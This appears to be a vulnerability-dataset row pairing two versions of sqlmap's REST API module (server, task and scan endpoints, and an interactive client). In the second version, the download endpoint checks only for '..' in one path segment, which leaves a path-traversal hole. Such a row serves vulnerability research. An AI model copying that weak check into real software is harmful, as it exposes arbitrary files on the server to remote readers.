    logger.debug(""[%s] Flushed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get(""/option/<taskid>/list"")
def option_list(taskid):
    """"""
    List options for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_list()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    logger.debug(""[%s] Listed task options"" % taskid)
    return jsonize({""success"": True, ""options"": DataStore.tasks[taskid].get_options()})


@post(""/option/<taskid>/get"")
def option_get(taskid):
    """"""
    Get the value of an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_get()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    option = request.json.get(""option"", """")

    if option in DataStore.tasks[taskid].options:
        logger.debug(""[%s] Retrieved value for option %s"" % (taskid, option))
        return jsonize({""success"": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug(""[%s] Requested value for unknown option %s"" % (taskid, option))
        return jsonize({""success"": False, ""message"": ""Unknown option"", option: ""not set""})


@post(""/option/<taskid>/set"")
def option_set(taskid):
    """"""
    Set an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_set()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug(""[%s] Requested to set options"" % taskid)
    return jsonize({""success"": True})


# Handle scans
@post(""/scan/<taskid>/start"")
def scan_start(taskid):
    """"""
    Launch a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_start()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug(""[%s] Started scan"" % taskid)
    return jsonize({""success"": True, ""engineid"": DataStore.tasks[taskid].engine_get_id()})


@get(""/scan/<taskid>/stop"")
def scan_stop(taskid):
    """"""
    Stop a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_stop()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_stop()

    logger.debug(""[%s] Stopped scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/kill"")
def scan_kill(taskid):
    """"""
    Kill a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_kill()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_kill()

    logger.debug(""[%s] Killed scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/status"")
def scan_status(taskid):
    """"""
    Returns status of a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_status()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if DataStore.tasks[taskid].engine_process() is None:
        status = ""not running""
    else:
        status = ""terminated"" if DataStore.tasks[taskid].engine_has_terminated() is True else ""running""

    logger.debug(""[%s] Retrieved scan status"" % taskid)
    return jsonize({
        ""success"": True,
        ""status"": status,
        ""returncode"": DataStore.tasks[taskid].engine_get_returncode()
    })


@get(""/scan/<taskid>/data"")
def scan_data(taskid):
    """"""
    Retrieve the data of a scan
    """"""
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_data()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            ""SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_data_message.append(
            {""status"": status, ""type"": content_type, ""value"": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            ""SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug(""[%s] Retrieved scan data and error messages"" % taskid)
    return jsonize({""success"": True, ""data"": json_data_message, ""error"": json_errors_message})


# Functions to handle scans' logs
@get(""/scan/<taskid>/log/<start>/<end>"")
def scan_log_limited(taskid, start, end):
    """"""
    Retrieve a subset of log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning(""[%s] Invalid start or end value provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid start or end value, must be digits""})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            (""SELECT time, level, message FROM logs WHERE ""
             ""taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC""),
            (taskid, start, end)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages subset"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


@get(""/scan/<taskid>/log"")
def scan_log(taskid):
    """"""
    Retrieve the log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ""SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC"", (taskid,)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


# Function to handle files inside the output directory
@get(""/download/<taskid>/<target>/<filename:path>"")
def download(taskid, target, filename):
    """"""
    Download a certain file from the file system
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to download()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    path = os.path.abspath(os.path.join(paths.SQLMAP_OUTPUT_PATH, target, filename))
    # Prevent file path traversal
    if not path.startswith(paths.SQLMAP_OUTPUT_PATH):
        logger.warning(""[%s] Forbidden path (%s)"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""Forbidden path""})

    if os.path.isfile(path):
        logger.debug(""[%s] Retrieved content of file %s"" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({""success"": True, ""file"": file_content.encode(""base64"")})
    else:
        logger.warning(""[%s] File does not exist %s"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""File does not exist""})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """"""
    REST-JSON API server
    """"""
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix=""sqlmapipc-"", text=False)[1]

    logger.info(""Running REST-JSON API server at '%s:%d'.."" % (host, port))
    logger.info(""Admin ID: %s"" % DataStore.admin_id)
    logger.debug(""IPC database: %s"" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == ""gevent"":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == ""eventlet"":
            import eventlet
            eventlet.monkey_patch()
        logger.debug(""Using adapter '%s' to run bottle"" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if ""already in use"" in getSafeExString(ex):
            logger.error(""Address already in use ('%s:%s')"" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = ""Adapter '%s' is not available on this system"" % adapter
        if adapter in (""gevent"", ""eventlet""):
            errMsg += "" (e.g.: 'sudo apt-get install python-%s')"" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug(""Calling %s"" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error(""Failed to load and parse %s"" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """"""
    REST-JSON API client
    """"""

    dbgMsg = ""Example client access from command line:""
    dbgMsg += ""\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid"" % (host, port)
    dbgMsg += ""\n\t$ curl -H \""Content-Type: application/json\"" -X POST -d '{\""url\"": \""http://testphp.vulnweb.com/artists.php?artist=1\""}' http://%s:%d/scan/$taskid/start"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/data"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/log"" % (host, port)
    logger.debug(dbgMsg)

    addr = ""http://%s:%d"" % (host, port)
    logger.info(""Starting REST-JSON API client to '%s'..."" % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = ""There has been a problem while connecting to the ""
            errMsg += ""REST-JSON API server at '%s' "" % addr
            errMsg += ""(%s)"" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info(""Type 'help' or '?' for list of available commands"")

    while True:
        try:
            command = raw_input(""api%s> "" % ("" (%s)"" % taskid if taskid else """")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in (""data"", ""log"", ""status"", ""stop"", ""kill""):
            if not taskid:
                logger.error(""No task ID in use"")
                continue
            raw = _client(""%s/scan/%s/%s"" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            dataToStdout(""%s\n"" % raw)

        elif command.startswith(""new""):
            if ' ' not in command:
                logger.error(""Program arguments are missing"")
                continue

            argv = [""sqlmap.py""] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client(""%s/task/new"" % addr)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to create new task"")
                continue
            taskid = res[""taskid""]
            logger.info(""New task ID is '%s'"" % taskid)

            raw = _client(""%s/scan/%s/start"" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to start scan"")
                continue
            logger.info(""Scanning started"")

        elif command.startswith(""use""):
            taskid = (command.split()[1] if ' ' in command else """").strip(""'\"""")
            if not taskid:
                logger.error(""Task ID is missing"")
                taskid = None
                continue
            elif not re.search(r""\A[0-9a-fA-F]{16}\Z"", taskid):
                logger.error(""Invalid task ID '%s'"" % taskid)
                taskid = None
                continue
            logger.info(""Switching to task ID '%s' "" % taskid)

        elif command in (""list"", ""flush""):
            raw = _client(""%s/admin/%s/%s"" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            elif command == ""flush"":
                taskid = None
            dataToStdout(""%s\n"" % raw)

        elif command in (""exit"", ""bye"", ""quit"", 'q'):
            return

        elif command in (""help"", ""?""):
            msg =  ""help        Show this help message\n""
            msg += ""new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \""http://testphp.vulnweb.com/artists.php?artist=1\""')\n""
            msg += ""use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n""
            msg += ""data        Retrieve and show data for current task\n""
            msg += ""log         Retrieve and show log for current task\n""
            msg += ""status      Retrieve and show status for current task\n""
            msg += ""stop        Stop current task\n""
            msg += ""kill        Kill current task\n""
            msg += ""list        Display all tasks\n""
            msg += ""flush       Flush tasks (delete all tasks)\n""
            msg += ""exit        Exit this client\n""

            dataToStdout(msg)

        elif command:
            logger.error(""Unknown command '%s'"" % command)
/n/n/n",0
57,b4bb4c393b26072b9a47f787be134888b983af60,"/lib/utils/api.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
""""""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = """"
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who=""server""):
        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug(""REST-JSON API %s connected to IPC database"" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not ""locked"" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith(""SELECT""):
            return self.cursor.fetchall()

    def init(self):
        self.execute(""CREATE TABLE logs(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, time TEXT, ""
                  ""level TEXT, message TEXT""
                  "")"")

        self.execute(""CREATE TABLE data(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, status INTEGER, ""
                  ""content_type INTEGER, value TEXT""
                  "")"")

        self.execute(""CREATE TABLE errors(""
                    ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                    ""taskid INTEGER, error TEXT""
                    "")"")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {""boolean"": False, ""string"": None, ""integer"": None, ""float"": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists(""sqlmap.py""):
            self.process = Popen([""python"", ""sqlmap.py"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen([""sqlmap"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype=""stdout""):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == ""stdout"":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == ""stdout"":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
                ""SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?"",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute(""DELETE FROM data WHERE id = ?"",
                                                     (output[index][0],))

                conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = ""%s%s"" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute(""UPDATE data SET value = ? WHERE id = ?"",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute(""INSERT INTO errors VALUES(NULL, ?, ?)"",
                                         (self.taskid, str(value) if value else """"))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """"""
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """"""
        conf.database_cursor.execute(""INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)"",
                                     (conf.taskid, time.strftime(""%X""), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, ""api""):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect(""client"")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, ""%s ('%s')"" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook(""after_request"")
def security_headers(json_header=True):
    """"""
    Set some headers across all HTTP responses
    """"""
    response.headers[""Server""] = ""Server""
    response.headers[""X-Content-Type-Options""] = ""nosniff""
    response.headers[""X-Frame-Options""] = ""DENY""
    response.headers[""X-XSS-Protection""] = ""1; mode=block""
    response.headers[""Pragma""] = ""no-cache""
    response.headers[""Cache-Control""] = ""no-cache""
    response.headers[""Expires""] = ""0""
    if json_header:
        response.content_type = ""application/json; charset=UTF-8""

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return ""Access denied""


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return ""Nothing here""


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return ""Method not allowed""


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return ""Internal server error""

#############################
# Task management functions #
#############################


# Users' methods
@get(""/task/new"")
def task_new():
    """"""
    Create new task ID
    """"""
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug(""Created new task: '%s'"" % taskid)
    return jsonize({""success"": True, ""taskid"": taskid})


@get(""/task/<taskid>/delete"")
def task_delete(taskid):
    """"""
    Delete own task ID
    """"""
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug(""[%s] Deleted task"" % taskid)
        return jsonize({""success"": True})
    else:
        logger.warning(""[%s] Invalid task ID provided to task_delete()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

###################
# Admin functions #
###################


@get(""/admin/<taskid>/list"")
def task_list(taskid=None):
    """"""
    List task pull
    """"""
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))[""status""]

    logger.debug(""[%s] Listed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True, ""tasks"": tasks, ""tasks_num"": len(tasks)})

@get(""/admin/<taskid>/flush"")
def task_flush(taskid):
    """"""
    Flush task spool (delete all tasks)
    """"""

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

    logger.debug(""[%s] Flushed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get(""/option/<taskid>/list"")
def option_list(taskid):
    """"""
    List options for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_list()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    logger.debug(""[%s] Listed task options"" % taskid)
    return jsonize({""success"": True, ""options"": DataStore.tasks[taskid].get_options()})


@post(""/option/<taskid>/get"")
def option_get(taskid):
    """"""
    Get the value of an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_get()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    option = request.json.get(""option"", """")

    if option in DataStore.tasks[taskid].options:
        logger.debug(""[%s] Retrieved value for option %s"" % (taskid, option))
        return jsonize({""success"": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug(""[%s] Requested value for unknown option %s"" % (taskid, option))
        return jsonize({""success"": False, ""message"": ""Unknown option"", option: ""not set""})


@post(""/option/<taskid>/set"")
def option_set(taskid):
    """"""
    Set an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_set()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug(""[%s] Requested to set options"" % taskid)
    return jsonize({""success"": True})


# Handle scans
@post(""/scan/<taskid>/start"")
def scan_start(taskid):
    """"""
    Launch a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_start()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug(""[%s] Started scan"" % taskid)
    return jsonize({""success"": True, ""engineid"": DataStore.tasks[taskid].engine_get_id()})


@get(""/scan/<taskid>/stop"")
def scan_stop(taskid):
    """"""
    Stop a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_stop()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_stop()

    logger.debug(""[%s] Stopped scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/kill"")
def scan_kill(taskid):
    """"""
    Kill a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_kill()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_kill()

    logger.debug(""[%s] Killed scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/status"")
def scan_status(taskid):
    """"""
    Returns status of a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_status()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if DataStore.tasks[taskid].engine_process() is None:
        status = ""not running""
    else:
        status = ""terminated"" if DataStore.tasks[taskid].engine_has_terminated() is True else ""running""

    logger.debug(""[%s] Retrieved scan status"" % taskid)
    return jsonize({
        ""success"": True,
        ""status"": status,
        ""returncode"": DataStore.tasks[taskid].engine_get_returncode()
    })


@get(""/scan/<taskid>/data"")
def scan_data(taskid):
    """"""
    Retrieve the data of a scan
    """"""
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_data()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            ""SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_data_message.append(
            {""status"": status, ""type"": content_type, ""value"": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            ""SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug(""[%s] Retrieved scan data and error messages"" % taskid)
    return jsonize({""success"": True, ""data"": json_data_message, ""error"": json_errors_message})


# Functions to handle scans' logs
@get(""/scan/<taskid>/log/<start>/<end>"")
def scan_log_limited(taskid, start, end):
    """"""
    Retrieve a subset of log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning(""[%s] Invalid start or end value provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid start or end value, must be digits""})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            (""SELECT time, level, message FROM logs WHERE ""
             ""taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC""),
            (taskid, start, end)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages subset"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


@get(""/scan/<taskid>/log"")
def scan_log(taskid):
    """"""
    Retrieve the log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ""SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC"", (taskid,)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


# Function to handle files inside the output directory
@get(""/download/<taskid>/<target>/<filename:path>"")
def download(taskid, target, filename):
    """"""
    Download a certain file from the file system
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to download()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Prevent file path traversal - the lame way
    if "".."" in target:
        logger.warning(""[%s] Forbidden path (%s)"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""Forbidden path""})

    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)

    if os.path.exists(path):
        logger.debug(""[%s] Retrieved content of file %s"" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({""success"": True, ""file"": file_content.encode(""base64"")})
    else:
        logger.warning(""[%s] File does not exist %s"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""File does not exist""})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """"""
    REST-JSON API server
    """"""
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix=""sqlmapipc-"", text=False)[1]

    logger.info(""Running REST-JSON API server at '%s:%d'.."" % (host, port))
    logger.info(""Admin ID: %s"" % DataStore.admin_id)
    logger.debug(""IPC database: %s"" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
